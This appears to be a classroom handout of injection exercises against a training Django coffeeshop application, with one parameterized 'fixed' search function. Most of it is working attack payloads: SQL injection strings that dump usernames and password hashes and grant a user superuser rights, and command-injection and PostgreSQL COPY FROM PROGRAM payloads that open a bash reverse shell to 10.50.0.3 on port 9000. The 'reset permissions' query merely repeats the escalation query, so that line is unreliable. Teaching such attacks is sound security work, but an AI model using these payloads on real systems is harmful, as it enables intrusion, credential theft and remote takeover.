Queres and code for injection exercises
=======================================

SQL Injection queries
---------------------

Show users:
xxx') union select id, username, password, 0.0 from auth_user --

Make bob an administrator
xxx'); update auth_user set is_staff=true, is_superuser=true where username = 'bob' --

Reset bob's permissions
xxx'); update auth_user set is_staff=true, is_superuser=true where username = 'bob' --

Fixed version of search()
-------------------------

@require_http_methods(["POST"])
def search(request):
    log = logging.getLogger('django')

    cart_size = get_cart_size(request.user)
    error_msg = ''
    if ('search' not in request.POST):
        error_msg = 'Please enter a search term'

    if (error_msg == ''):
        search_text = request.POST['search']
        with connection.cursor() as cursor:
            sql = '''SELECT id, name, description, unit_price 
                       FROM coffeeshop_product
                      WHERE (LOWER(name) like %s or LOWER(description) like %s)
                  '''
            log.info("Search: " + sql)
            products = []
            try:
                search_term = '%' + search_text.lower().replace('%', '%%') + '%'
                cursor.execute(sql, (search_term, search_term))
                for row in cursor.fetchall():
                    (pk, name, description, unit_price) = row
                    product = Product(id=pk, name=name, description=description, 
                        unit_price=unit_price)
                    products.append(product)
            except Exception as e:
                print(e)
    context = {"products": products, "cart_size": cart_size, "header": 'Search'}
    return render(request, 'coffeeshop/index.html', context)

-------------------------------------------------------------------------------

Text for Command Injection
--------------------------

" && bash -c 'bash -i >& /dev/tcp/10.50.0.3/9000 0>&1' #


Query for SQL reverse shell
---------------------------

xxx'); CREATE TABLE trigger_test ( tt_id serial PRIMARY KEY, command_output text); COPY trigger_test (command_output) FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.50.0.3/9000 0>&1 &'''; --

(for this to work, your application will have to connect to the database as user postgres,
not user coffeeshopowner)
